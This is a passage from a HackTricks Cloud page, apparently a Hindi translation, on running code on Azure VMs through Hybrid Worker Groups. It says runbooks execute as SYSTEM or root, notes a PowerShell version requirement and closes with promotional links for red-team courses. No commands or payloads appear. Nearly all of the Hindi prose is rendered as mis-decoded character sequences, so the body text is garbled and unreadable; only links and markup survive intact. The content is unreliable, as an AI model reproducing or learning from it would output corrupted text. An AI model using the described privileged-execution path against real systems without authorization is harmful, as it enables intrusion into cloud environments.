рджреЛрдиреЛрдВ рддрдХрдиреАрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЕрджреНрд╡рд┐рддреАрдп рддрд░реАрдХреЛрдВ рд╕реЗ рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдФрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХрд╛ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрд╛рдп рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЖрдЬрд╝рд░ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ, рдкреНрд░рддреНрдпреЗрдХ рдХреЗ рдЕрдкрдиреЗ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ, рдХрджрдореЛрдВ, рдФрд░ рд╡рд┐рдЪрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рдеред

### рдПрдЬрд╝реНрдпреВрд░ рдореЗрдВ рд╣рд╛рдЗрдмреНрд░рд┐рдб рд╡рд░реНрдХрд░ рдЧреНрд░реБрдкреНрд╕ (HWGs)

[**рд╣рд╛рдЗрдмреНрд░рд┐рдб рд╡рд░реНрдХрд░ рдЧреНрд░реБрдкреНрд╕ (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ рдЬреЛ рдПрдЬрд╝реНрдпреВрд░ рдореЗрдВ рд╣реИ рдЬреЛ рд░рдирдмреБрдХреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рдПрдХ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╣реЛрддреЗ рд╣реИрдВ, рдПрдХ рдПрдЬрд╝реНрдпреВрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди (VM) рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд HWG рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрди рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реБрд╡рд┐рдзрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬреЛ VM рдкрд░ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рд░рдирдмреБрдХ рдХреЛрдб рдХреЛ VM рдкрд░ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрд╣рд▓реВ рдпрд╣ рд╣реИ рдХрд┐ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ рдПрдХ рдХрд╛рд░рдХ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдб рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ **SYSTEM** рдпрд╛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЖрдХрд╛рд░ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред

рд╡рд┐рдВрдбреЛрдЬ 10 VMs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╡рд┐рд╡рд░рдг рд╣реИ рдХрд┐ рд░рдирдмреБрдХ рдХреЗ рд▓рд┐рдП PowerShell рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдпрд╣ PowerShell рд╕рдВрд╕реНрдХрд░рдг 7.1 рдХреА рдмрдЬрд╛рдп 5.1 рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдЗрд╕ рдмрд╛рдд рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдХрд┐ рдЗрди VMs рдкрд░ PowerShell 7.1 рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдирд╣реАрдВ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрдЧрд░ рд╕рдВрд╕реНрдХрд░рдг 7.1 рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ рд╡рд┐рдлрд▓рддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

рдпрд╣ рдПрдЬрд╝реНрдпреВрд░ рдХреА рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ рдЬреЛ рд╣рд╛рдЗрдмреНрд░рд┐рдб рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдкрд░ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдордЬрдмреВрдд рд╡рд┐рдзрд┐ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рдЬреЛ рдПрдЬрд╝реНрдпреВрд░ VMs рдкрд░ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХреЗрдВрджреНрд░реАрдХреГрдд рдкреНрд░рдмрдВрдзрди рдФрд░ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред


## рд╕рдВрджрд░реНрдн

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}
